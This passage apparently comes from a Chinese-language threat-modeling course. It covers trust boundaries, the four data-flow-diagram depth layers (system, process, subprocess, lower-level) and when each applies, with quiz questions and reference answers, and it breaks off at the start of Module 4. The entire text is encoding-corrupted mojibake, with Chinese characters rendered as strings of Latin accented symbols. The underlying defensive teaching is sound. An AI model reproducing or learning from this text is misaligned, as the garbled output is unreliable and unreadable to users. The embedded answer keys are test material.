åŒ…å«ä¿¡ä»»è¾¹ç•Œä»¥å¤„ç†è·¨ä¸åŒä¿¡ä»»åŒºåŸŸçš„æ•°æ®æµ ä¿¡ä»»è¾¹ç•Œçº¿ç”¨äºè¡¨ç¤ºè·¨å¤§å‹ç¯å¢ƒï¼ˆä¾‹å¦‚ Internetï¼‰çš„æ•°æ®æµ ä¿¡ä»»è¾¹ç•Œæ¡†è¡¨ç¤ºå°å‹ç¯å¢ƒï¼Œä¾‹å¦‚æ²™ç›’ç¯å¢ƒå’Œä¼ä¸šç½‘ç»œ åŒ…å«ä¸Šä¸‹æ–‡åœ¨æ¯ä¸ªä¿¡ä»»è¾¹ç•Œå…ƒç´ ä¸­åŒ…å«ä»¥ä¸‹ä¸Šä¸‹æ–‡ï¼š ä¸Šä¸‹æ–‡ é—®é¢˜ æè¿° å…¬å¸ç½‘ç»œè¾¹ç•Œï¼ŸInternetï¼Ÿ Azure è®¢é˜…ï¼Ÿ çŸ¥è¯†æ£€æŸ¥ ä»¥ä¸‹å“ªä¸€é¡¹æ“ä½œæœ€èƒ½æè¿°è·¨ä¿¡ä»»è¾¹ç•Œçš„æ•°æ®ï¼Ÿ A. ç”¨æˆ·å‘é€åˆ°æ‰˜ç®¡åœ¨ Azure ä¸Šçš„ Web æœåŠ¡çš„æ•°æ®ã€‚ B. åœ¨åŒä¸€ Azure è®¢é˜…ä¸‹ï¼Œä» Web æœåŠ¡å‘é€åˆ° Azure ä¸Šçš„æ•°æ®å­˜å‚¨çš„æ•°æ®ã€‚ C. ä»æ•°æ®å­˜å‚¨å‘é€åˆ° Azure ä¸ŠåŒä¸€ç§Ÿæˆ·ä¸‹çš„è¿›ç¨‹çš„æ•°æ®ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. å°†æ•°æ®ä»ä¸å—ä¿¡ä»»çš„åŒºåŸŸä¼ è¾“åˆ°å—ä¿¡ä»»åŒºåŸŸçš„è¡Œä¸ºè·¨è¶Šäº†ä¿¡ä»»è¾¹ç•Œã€‚B. ä»åŒä¸€å—ä¿¡ä»»åŒºåŸŸå†…çš„èµ„æºä¼ è¾“æ•°æ®çš„è¡Œä¸ºä¸ä¼šè·¨è¶Šä¿¡ä»»è¾¹ç•Œã€‚C. ä»åŒä¸€å—ä¿¡ä»»åŒºåŸŸå†…çš„èµ„æºä¼ è¾“æ•°æ®çš„è¡Œä¸ºä¸ä¼šè·¨è¶Šä¿¡ä»»è¾¹ç•Œã€‚ å°ç»“æ•°æ®æµå…³ç³»å›¾æ˜¯ç³»ç»Ÿçš„å›¾å½¢è¡¨ç¤ºå½¢å¼ï¼Œå®ƒåº”åŒ…å«æ¯ä¸ªé€‚ç”¨çš„è¿‡ç¨‹ã€æ•°æ®å­˜å‚¨ã€å¤–éƒ¨å®ä½“ã€æ•°æ®æµå’Œä¿¡ä»»è¾¹ç•Œã€‚ æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š åŒºåˆ†äº†æ¯ä¸ªå…ƒç´ çš„å½¢çŠ¶å’ŒåŠŸèƒ½ äº†è§£äº†åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾æ—¶å…ƒç´ çš„æ­£ç¡®ä¸Šä¸‹æ–‡ æ¨¡å—3 | æä¾›å…·æœ‰é€‚å½“æ·±åº¦å±‚çš„ä¸Šä¸‹æ–‡ä»‹ç»å·¥ç¨‹å¸ˆåˆ©ç”¨å¨èƒå»ºæ¨¡èƒ½å¤Ÿä»¥å›¾å½¢æ–¹å¼å‘ä»–äººæè¿°ç³»ç»Ÿã€‚ å®ƒåˆ›å»ºäº†ä¸€ä¸ªå…±åŒçš„åŸºç¡€ï¼Œå¹¶å®ç°äº†æ›´åŠ é›†ä¸­çš„å®‰å…¨å¯¹è¯ã€‚ æ·±åº¦å±‚çš„é‡è¦æ€§æ ¹æ®è¦æ„å»ºçš„ç³»ç»Ÿå’Œæ‰€éœ€çš„ä¸Šä¸‹æ–‡ï¼Œå¨èƒæ¨¡å‹å¯èƒ½å˜å¾—å¤ªå¤æ‚æˆ–çº§åˆ«å¤ªé«˜ã€‚ æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚å¯å¸®åŠ©ä½ äº†è§£è¦åŒ…å«å¤šå°‘ä¸Šä¸‹æ–‡ä»¥åŠä½•æ—¶ä½¿ç”¨å®ƒä»¬ã€‚ è¯·ä¸åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿè”ç³»ï¼Œé€‰æ‹©é€‚å½“çš„æ·±åº¦å±‚ã€‚ ä¹Ÿå¯ä»¥å°†æ­¤æ¨¡å—ç”¨ä½œå‚è€ƒã€‚ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ å°†èƒ½å¤Ÿï¼š äº†è§£æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚ä¹‹é—´çš„å·®å¼‚ äº†è§£ä½•æ—¶ä½¿ç”¨æ¯ä¸ªå±‚ æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚å¯å¸®åŠ©ä½ ç¡®å®šè¦æˆåŠŸè¿›è¡Œå¨èƒå»ºæ¨¡ç»ƒä¹ åº”åŒ…æ‹¬å¤šå°‘ä¸Šä¸‹æ–‡ã€‚ æœ‰å¤šä¸ªå› ç´ å¯å¸®åŠ©ç¡®å®šè¦äº†è§£çš„æ·±åº¦ã€‚ æ¯ä¸ªç³»ç»Ÿéƒ½åº”è¯¥å¤§è‡´äº†è§£å®ƒä»¬çš„å·¥ä½œæ–¹å¼ã€‚ å¤§å¤šæ•°ç³»ç»Ÿåº”è¯¥å…·æœ‰é™„åŠ çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾ä¾§é‡äºéœ€è¦ä»”ç»†ç ”ç©¶çš„ç³»ç»Ÿéƒ¨åˆ†ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š åˆ†æé«˜åº¦æ•æ„Ÿæ•°æ®çš„è¿‡ç¨‹ ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯ç³»ç»Ÿ å¨èƒå»ºæ¨¡ä¸­å¤§è‡´ä½¿ç”¨äº†å››ä¸ªæ·±åº¦å±‚ï¼š å±‚ æè¿° 0 å¯¹äºæ‰€æœ‰ç³»ç»Ÿéƒ½æ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«ä¸»è¦ç³»ç»Ÿéƒ¨åˆ†ã€‚ 1 å¯¹äºå¤§å¤šæ•°ç³»ç»Ÿæ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«æ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†çš„å…¶ä»–å…³ç³»å›¾ã€‚ 2 å¯¹äºé«˜åº¦æ•æ„Ÿçš„ç³»ç»Ÿæ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«ç³»ç»Ÿå­éƒ¨åˆ†çš„å…¶ä»–å…³ç³»å›¾ã€‚ 3 å¯¹äºå…³é”®çº§åˆ«ç³»ç»Ÿæˆ–å†…æ ¸çº§åˆ«ç³»ç»Ÿæ˜¯å¿…éœ€çš„ï¼Œå¹¶ä¸”åŒ…å«æ¯ä¸ªè¿‡ç¨‹çš„å…¶ä»–å…³ç³»å›¾ã€‚ æˆ‘ä»¬å°†åœ¨æ¥ä¸‹æ¥çš„å‡ ä¸ªå•å…ƒä¸­ä»‹ç»å„ä¸ªæ·±åº¦å±‚ã€‚ ç¬¬ 0 å±‚ - ç³»ç»Ÿå±‚æ•°æ®æµå…³ç³»å›¾çš„ç³»ç»Ÿå±‚æ˜¯ä»»ä½•ç³»ç»Ÿçš„èµ·ç‚¹ï¼Œå› æ­¤å¿…é¡»ä¸ºæ‰€æœ‰ç³»ç»Ÿåˆ›å»ºç³»ç»Ÿå±‚ã€‚ ç›®æ ‡ï¼šè¡¨ç¤ºä¸»è¦çš„ç³»ç»Ÿéƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚ ç³»ç»Ÿå±‚å…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ã€‚ å®ƒè¿˜åº”åªåŒ…å«ç³»ç»Ÿå¤„ç†çš„ä¸»è¦è¿‡ç¨‹ã€‚ æä¾›å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡ï¼Œå¹¶æ¸…æ¥šæ ‡è®°æ¯ä¸ªå…ƒç´ ï¼Œä»¥ä¾¿ä»»ä½•äººéƒ½èƒ½ç†è§£å®ƒçš„å·¥ä½œæ–¹å¼ã€‚ ç³»ç»Ÿå±‚ä¹Ÿç§°ä¸ºä¸Šä¸‹æ–‡å±‚ã€‚ ä½•æ—¶ä½¿ç”¨ç³»ç»Ÿå±‚ä½ åˆ›å»ºçš„æ¯ä¸ªç³»ç»Ÿéƒ½éœ€è¦ç³»ç»Ÿå±‚ã€‚ é«˜çº§åˆ«çš„ä¸Šä¸‹æ–‡å¯ä»¥å¸®åŠ©ä»»ä½•äººæ·±å…¥äº†è§£ç³»ç»Ÿï¼Œä»è€Œå‚ä¸æ›´æœ‰æ„ä¹‰çš„è®¨è®ºã€‚ æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç³»ç»Ÿéƒ¨åˆ†éœ€è¦è¿›è¡Œæ›´æ·±å…¥çš„ç ”ç©¶ï¼Œå› ä¸ºå®ƒä»¬ä¼šå¸¦æ¥é£é™©ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ä»»ä½•æ–°ç³»ç»Ÿéƒ½ä¼šç»™ç¯å¢ƒå¸¦æ¥æœªçŸ¥é£é™© æ–°çš„åˆ†æç¨‹åºã€åè®®å’Œæ–‡ä»¶æ ¼å¼ æ–°çš„èº«ä»½éªŒè¯å’Œæˆæƒæœºåˆ¶ æ–°çš„æœºå¯†å­˜å‚¨æˆ–åŠ å¯†ç®—æ³• ä¸ç¬¬ä¸‰æ–¹èº«ä»½éªŒè¯ç³»ç»Ÿï¼ˆä¾‹å¦‚ Facebookï¼‰é›†æˆ ä¸»è¦åŠŸèƒ½æ‰€éœ€çš„æå‡æƒé™ æ‰€éœ€çš„æœªåŠ å¯†ä¿¡é“ å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œè¯·ä¸ºæ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†åˆ›å»ºå…¶ä»–æ•°æ®æµå…³ç³»å›¾ã€‚ æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š æ­¥éª¤ æŒ‡å— 1 ä½¿ç”¨æ¸…æ™°çš„æè¿°æ ‡ç­¾åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹å…ƒç´ ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡åç§°â€ã€‚ 2 åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¹¶å®Œå…¨æŒ‰ç…§æè¿°æ ‡ç­¾ä¸ºå…¶å‘½åã€‚ 3 ä»…å°†æ•°æ®æµå…³ç³»å›¾ä¾§é‡äºè¦â€œæ”¾å¤§â€çš„ç³»ç»Ÿéƒ¨åˆ†ã€‚ ç»“æœå°†è·å¾—è¿‡ç¨‹å±‚ï¼ˆç§°ä¸ºç¬¬ 1 å±‚ï¼‰ä¸­çš„ä¸€ç³»åˆ—æ•°æ®æµå…³ç³»å›¾ã€‚ çŸ¥è¯†æ£€æŸ¥ ç¬¬ 0 å±‚é€šå¸¸è¢«ç§°ä¸ºä»€ä¹ˆï¼Ÿ A. ä¸Šä¸‹æ–‡å±‚ã€‚ B. è¿‡ç¨‹å±‚ã€‚ C. å­è¿‡ç¨‹å±‚ã€‚ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. æ­¤å±‚æ˜¯ä»»ä½•ç³»ç»Ÿçš„èµ·ç‚¹ã€‚ ä¹Ÿç§°ä¸ºç³»ç»Ÿå±‚ã€‚B. æ­¤å±‚ä¾§é‡äºæ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†ã€‚C. æ­¤å±‚ä¾§é‡äºç‰¹å®šç³»ç»Ÿéƒ¨åˆ†çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚ ç¬¬ 1 å±‚ - è¿‡ç¨‹å±‚æ•°æ®æµå…³ç³»å›¾çš„è¿‡ç¨‹å±‚æ˜¯ç¬¬äºŒå±‚ä¸”åº”è¯¥ç”¨äºå¤§å¤šæ•°ç³»ç»Ÿã€‚ æ­¤å±‚çš„æ•°æ®æµå…³ç³»å›¾åŒ…å«å•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾è¯¦ç»†ä»‹ç»æ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†ã€‚ ç›®æ ‡ï¼šè¡¨ç¤ºæ¬¡è¦çš„ç³»ç»Ÿéƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚ ä¸ç³»ç»Ÿå±‚ç›¸ä¼¼ï¼Œè¿‡ç¨‹å±‚ä¸­çš„æ•°æ®æµå…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œå¹¶åŒ…å«å…¶å„è‡ªç³»ç»Ÿéƒ¨åˆ†çš„æ‰€æœ‰è¿‡ç¨‹ã€‚ å¤§å¤šæ•°æ•°æ®æµå…³ç³»å›¾éƒ½éœ€è¦è¿‡ç¨‹çº§åˆ«æ·±åº¦å±‚æ‰èƒ½è¿›è¡Œæ­£ç¡®è¯„ä¼°ã€‚ ä½•æ—¶ä½¿ç”¨è¿‡ç¨‹å±‚å¯¹æ¯ä¸ªç³»ç»Ÿéƒ½ä½¿ç”¨è¿‡ç¨‹å±‚ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†æ•æ„Ÿæ•°æ®æ—¶ã€‚ å…·æœ‰æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿé­å—æ”»å‡»çš„é£é™©æ›´é«˜ã€‚ æ­¤çº§åˆ«çš„ä¸Šä¸‹æ–‡å¯å¸®åŠ©ä½ æ‰¾å‡ºå¨èƒä»¥åŠæ›´æœ‰æ•ˆåœ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ æ·±å…¥äº†è§£ç³»ç»Ÿéƒ¨åˆ†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”±äºç³»ç»Ÿéƒ¨åˆ†çš„æ•æ„Ÿæ€§å’Œé£é™©å¢åŠ ï¼Œå¯èƒ½éœ€è¦æ›´ç²¾ç»†çš„ä¸Šä¸‹æ–‡ã€‚ é€šè¿‡è½¬åˆ°æ­¤å±‚ï¼Œå¯ä»¥æ›´å¥½åœ°è¯„ä¼°å¨èƒå’Œé£é™©é™ä½ç­–ç•¥ã€‚ éµå¾ªç³»ç»Ÿå±‚ä¸­çš„ç›¸åŒè§„åˆ™ã€‚ æ­¥éª¤ æŒ‡å— 1 ä½¿ç”¨æ¸…æ™°çš„æè¿°æ ‡ç­¾åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹å…ƒç´ ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡å·¥ä½œè¿›ç¨‹åç§°â€ã€‚ 2 åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¹¶å®Œå…¨æŒ‰ç…§æè¿°æ ‡ç­¾ä¸ºå…¶å‘½åï¼Œå‘½åé‡‡ç”¨ç±»ä¼¼è·¯å¾„çš„ç»“æ„ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡åç§° - Web æœåŠ¡å·¥ä½œè¿›ç¨‹åç§°â€ã€‚ 3 ä»…å°†æ•°æ®æµå…³ç³»å›¾ä¾§é‡äºè¦â€œæ”¾å¤§â€çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚ ç»“æœå°†è·å¾—å­è¿‡ç¨‹å±‚ï¼ˆç§°ä¸ºç¬¬ 2 å±‚ï¼‰ä¸­çš„ä¸€ç³»åˆ—æ•°æ®æµå…³ç³»å›¾ã€‚ ç±»ä¼¼è·¯å¾„çš„æ–‡ä»¶å‘½åç»“æ„æœ‰åŠ©äºåŒºåˆ†ä¸åŒçš„çº§åˆ« çŸ¥è¯†æ£€æŸ¥ å¤§å¤šæ•°åº”ç”¨ç¨‹åºå±äºå“ªä¸€å±‚ï¼Ÿ A. ä¸Šä¸‹æ–‡å±‚ã€‚ B. è¿‡ç¨‹å±‚ã€‚ C. å­è¿‡ç¨‹å±‚ã€‚ å‚è€ƒç­”æ¡ˆï¼š== B == è§£é‡Šï¼šA. æ­¤å±‚æ˜¯ä»»ä½•ç³»ç»Ÿçš„èµ·ç‚¹ã€‚ ä¹Ÿç§°ä¸ºç³»ç»Ÿå±‚ã€‚B. æ­¤å±‚ä¾§é‡äºæ¯ä¸ªç³»ç»Ÿéƒ¨åˆ†ã€‚C. æ­¤å±‚ä¾§é‡äºç‰¹å®šç³»ç»Ÿéƒ¨åˆ†çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚ ç¬¬ 2 å±‚ - å­è¿‡ç¨‹å±‚æ•°æ®æµå…³ç³»å›¾å­è¿‡ç¨‹æ˜¯ç¬¬ä¸‰å±‚ã€‚ æ¯å½“åœ¨åˆ›å»ºé«˜åº¦æ•æ„Ÿçš„ç³»ç»Ÿæ—¶å°±åº”ä½¿ç”¨è¯¥å±‚ã€‚ æ­¤å±‚çš„æ•°æ®æµå…³ç³»å›¾åŒ…å«å•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾åˆ†åˆ«è¯¦ç»†ä»‹ç»æ¯ä¸ªç³»ç»Ÿå­éƒ¨åˆ†ã€‚ ç›®æ ‡ï¼šè¡¨ç¤ºç³»ç»Ÿå­éƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚ ä¸è¿‡ç¨‹å±‚ç›¸ä¼¼ï¼Œç³»ç»Ÿå­è¿‡ç¨‹å±‚ä¸­çš„æ•°æ®æµå…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œå¹¶åŒ…å«å…¶å„è‡ªç³»ç»Ÿå­éƒ¨åˆ†çš„æ‰€æœ‰è¿‡ç¨‹ã€‚ è¯·ä¸ä½ çš„å›¢é˜Ÿæ ¸å¯¹ä»¥ç¡®è®¤æ˜¯å¦éœ€è¦æ­¤æ·±åº¦çº§åˆ«ã€‚ ä½•æ—¶ä½¿ç”¨å­è¿‡ç¨‹å±‚å°†å­è¿‡ç¨‹å±‚ç”¨äºç»„ç»‡è®¤ä¸ºæ¯”è¾ƒå…³é”®çš„ç³»ç»Ÿã€‚ ç³»ç»Ÿå­éƒ¨åˆ†ä¸­çš„æ¼æ´å¯èƒ½ä¼šä½¿æ•´ä¸ªç³»ç»Ÿã€å®¢æˆ·å’Œç»„ç»‡é¢ä¸´é‡å¤§é£é™©ã€‚ ç¤ºä¾‹åŒ…æ‹¬ä»¥ä¸‹ç³»ç»Ÿï¼š åœ¨å®‰å…¨ç¯å¢ƒä¸­ä½¿ç”¨çš„ç³»ç»Ÿ å¤„ç†æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿ å…·æœ‰é«˜é£é™©è¯„åˆ†çš„ç³»ç»Ÿ æ·±å…¥äº†è§£ç³»ç»Ÿå­éƒ¨åˆ†ä»»ä½•éœ€è¦æ›´æ·±å…¥ç ”ç©¶çš„ç³»ç»Ÿå­éƒ¨åˆ†éƒ½åº”éµå¾ªè¿‡ç¨‹å±‚ä¸­çš„ç›¸åŒè§„åˆ™ï¼Œå¹¶å…·æœ‰å„è‡ªç‹¬ç«‹çš„æ•°æ®æµå…³ç³»å›¾ã€‚ é€šè¿‡è¾ƒä½çº§åˆ«çš„è§†å›¾ï¼Œç”¨æˆ·å¯ä»¥â€œæ”¾å¤§â€å’Œâ€œç¼©å°â€ç³»ç»Ÿï¼Œä»¥å±•ç°å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡å¹¶è¾¾åˆ°æ›´ä½³çš„æ¸…æ™°åº¦ã€‚ æ–¹æ³•å¦‚ä¸‹ï¼š æ­¥éª¤ æŒ‡å— 1 ä½¿ç”¨æ¸…æ™°çš„æè¿°æ ‡ç­¾åˆ›å»ºä¸€ä¸ªè¿‡ç¨‹å…ƒç´ ï¼Œä¾‹å¦‚â€œè¾“å…¥åˆ†æç¨‹åºåç§°â€ã€‚ 2 åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ä¸æè¿°æ ‡ç­¾å®Œå…¨ç›¸åŒçš„åç§°ä¸ºå…¶å‘½åï¼Œå‘½åé‡‡ç”¨æ ‘çŠ¶ç»“æ„ï¼Œä¾‹å¦‚â€œWeb æœåŠ¡åç§° - Web æœåŠ¡å·¥ä½œè¿›ç¨‹åç§° - è¾“å…¥åˆ†æç¨‹åºåç§°â€ã€‚ 3 ä»…å°†æ•°æ®æµå…³ç³»å›¾ä¾§é‡äºè¦â€œæ”¾å¤§â€çš„è¾ƒä½çº§åˆ«çš„ç³»ç»Ÿå­éƒ¨åˆ†ã€‚ ç»“æœå°†å¾—åˆ°è¾ƒä½çº§åˆ«å±‚ï¼ˆç§°ä¸ºç¬¬ 3 å±‚ï¼‰ä¸­çš„ä¸€ç³»åˆ—æ•°æ®æµå…³ç³»å›¾ã€‚ ç±»ä¼¼è·¯å¾„çš„æ–‡ä»¶å‘½åç»“æ„æœ‰åŠ©äºåŒºåˆ†ä¸åŒçš„çº§åˆ«ã€‚ ç¬¬ 3 å±‚ - è¾ƒä½çº§åˆ«å±‚ä½çº§åˆ«å±‚æ˜¯æœ€åä¸€å±‚ï¼Œåº”åœ¨åˆ›å»ºå†…æ ¸çº§åˆ«ç³»ç»Ÿæˆ–å…³é”®çº§åˆ«ç³»ç»Ÿæ—¶ä½¿ç”¨ã€‚ æ­¤å±‚çš„æ•°æ®æµå…³ç³»å›¾åŒ…å«å•ç‹¬çš„æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™äº›å…³ç³»å›¾è¯¦ç»†ä»‹ç»æ¯ä¸ªä½çº§åˆ«ç³»ç»Ÿå­éƒ¨åˆ†ã€‚ ç›®æ ‡ï¼šè¡¨ç¤ºä½çº§åˆ«ç³»ç»Ÿå­éƒ¨åˆ†ï¼ˆå…·æœ‰è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼‰ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚ ä¸è¿‡ç¨‹å±‚ç›¸ä¼¼ï¼Œç³»ç»Ÿå­è¿‡ç¨‹å±‚ä¸­çš„æ•°æ®æµå…³ç³»å›¾åº”å®¹çº³åœ¨ä¸€ä¸ªé¡µé¢ä¸­ï¼Œå¹¶åŒ…å«å…¶å„è‡ªç³»ç»Ÿå­éƒ¨åˆ†çš„æ‰€æœ‰è¿‡ç¨‹ã€‚ è¯·ä¸ä½ çš„å›¢é˜Ÿæ ¸å¯¹ä»¥ç¡®è®¤æ˜¯å¦éœ€è¦æ­¤æ·±åº¦çº§åˆ«ã€‚ ä½•æ—¶ä½¿ç”¨ä½çº§åˆ«å±‚é«˜åº¦å…³é”®çº§åˆ«ç³»ç»Ÿå’Œå†…æ ¸çº§åˆ«çš„ç³»ç»Ÿåº”åœ¨æ­¤å±‚è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚ æ•°æ®æµå…³ç³»å›¾åº”è¯¦ç»†æè¿°æ¯ä¸ªå­è¿‡ç¨‹ã€‚ æ­¤å¤–ï¼Œé€šå¸¸åªä¸ºä¸€ä¸ªå­è¿‡ç¨‹è¿›è¡Œå¤šè½®å®‰å…¨æ£€æŸ¥ã€‚ æŒ‰ç…§å‰é¢å„å±‚ä¸­çš„æ­¥éª¤æ“ä½œï¼Œå°†æ¯ä¸ªå…³ç³»å›¾è¿½æº¯åˆ°å„è‡ªçš„ç³»ç»Ÿéƒ¨åˆ†ã€‚ å°ç»“æ‘˜è¦å·¥ç¨‹å¸ˆåˆ©ç”¨å¨èƒå»ºæ¨¡èƒ½å¤Ÿä»¥å›¾å½¢æ–¹å¼å‘ä»–äººæè¿°ç³»ç»Ÿã€‚ å®ƒåˆ›å»ºäº†ä¸€ä¸ªå…±åŒçš„åŸºç¡€ï¼Œå¹¶å®ç°äº†æ›´åŠ é›†ä¸­çš„å®‰å…¨å¯¹è¯ã€‚ ä½†æ˜¯ï¼Œæ ¹æ®è¦æ„å»ºçš„ç³»ç»Ÿå’Œæ‰€éœ€çš„ä¸Šä¸‹æ–‡ï¼Œå¨èƒæ¨¡å‹å¯èƒ½å˜å¾—å¤ªå¤æ‚æˆ–çº§åˆ«å¤ªé«˜ã€‚ åœ¨æœ¬æ¨¡å—ä¸­ï¼Œä½ äº†è§£äº†å¦‚ä½•ç¡®å®šé—®é¢˜çš„ä¼˜å…ˆçº§ï¼Œä»¥åŠå¦‚ä½•æ ¹æ®ç±»å‹å’ŒåŠŸèƒ½åº”ç”¨æ°å½“çš„å®‰å…¨æ§åˆ¶å±‚ã€‚ æœ¬æ¨¡å—æ¶µç›–äº†ä»¥ä¸‹å†…å®¹ï¼š äº†è§£äº†æ•°æ®æµå…³ç³»å›¾æ·±åº¦å±‚ä¹‹é—´çš„å·®å¼‚ äº†è§£äº†ä½•æ—¶ä½¿ç”¨æ¯ä¸ªå±‚ ä½ çŸ¥é“å—ï¼Ÿ é™¤äº†è¿™å››ä¸ªå±‚ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥æ ¹æ®ç”¨æˆ·è§’è‰²åˆ›å»ºå…³ç³»å›¾ï¼Œä»¥å¸®åŠ©æ‰¾å‡ºèº«ä»½éªŒè¯å’Œæˆæƒæ–¹é¢çš„ç¼ºé™·ã€‚ æ® OWASP ç­‰ä¿¡æ¯æºçš„æŠ¥é“ï¼Œè¿™äº›äº‹æ•…æ˜¯ç›®å‰å„ä¸ªç»„ç»‡é¢ä¸´çš„æœ€å¤§å®‰å…¨é—®é¢˜ï¼Œå› æ­¤ï¼Œæ ¹æ®é€‚ç”¨çš„è§’è‰²åº”ç”¨å¨èƒæ¨¡å‹å¯ä»¥å¢å¼ºæ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨æ€§å¹¶å¸®åŠ©ä¿æŠ¤å®¢æˆ·ã€‚ çŸ¥è¯†æ£€æŸ¥ ä»¥ä¸‹å“ªæ¡é™ˆè¿°æ¦‚æ‹¬äº†åœ¨å¨èƒå»ºæ¨¡é˜¶æ®µææ—©å®šä¹‰ä¸Šä¸‹æ–‡æ·±åº¦å±‚çš„é‡è¦æ€§ A. è¿™æ ·æˆ‘å¯ä»¥æ”¶é›†æ‰€æœ‰ä½¿ç”¨çš„å¤–éƒ¨ç»„ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚ B. è¿™æ ·åšå¯ä»¥å¸®åŠ©æˆ‘æ ¹æ®è¦æ±‚å’ŒæœŸæœ›ç”Ÿæˆæ°å½“çº§åˆ«çš„ä¸Šä¸‹æ–‡ã€‚ C. è¿™æ ·åšæœ‰åŠ©äºåœ¨è¿›è¡Œå®‰å…¨è¯„å®¡ä¹‹å‰æ‰¾å‡ºæ‰€æœ‰ç›¸å…³å¨èƒã€‚ å‚è€ƒç­”æ¡ˆï¼š== B == è§£é‡Šï¼šA. è¯¥é™ˆè¿°æè¿°äº†è®¾è®¡é˜¶æ®µçš„ä¸€éƒ¨åˆ†ï¼Œä½†æœªå®šä¹‰ä¸Šä¸‹æ–‡æ·±åº¦å±‚çš„é‡è¦æ€§ã€‚B. æ­¤é™ˆè¿°é˜æ˜äº†åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰è®¾ç½®é€‚å½“ä¸Šä¸‹æ–‡çº§åˆ«çš„é‡è¦æ€§ã€‚C. æ­¤é™ˆè¿°æè¿°äº†ä¸­æ–­é˜¶æ®µçš„ä¸€éƒ¨åˆ†ï¼Œè¯¥é˜¶æ®µå‘ç”Ÿåœ¨åˆ›å»ºæ•°æ®æµä¹‹åã€‚ æ¨¡å—4 | å¤„ç†æ•°æ®æµå…³ç³»å›¾å…³æ³¨é€‚å½“çš„å¨èƒæ¨¡å‹å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§æœ‰æ•ˆçš„æŠ€æœ¯ï¼Œå¯å¸®åŠ©ä½ ç¡®å®šå¨èƒä»¥åŠæ‰¾åˆ°é™ä½é£é™©çš„æ–¹æ³•ã€‚ ä½ 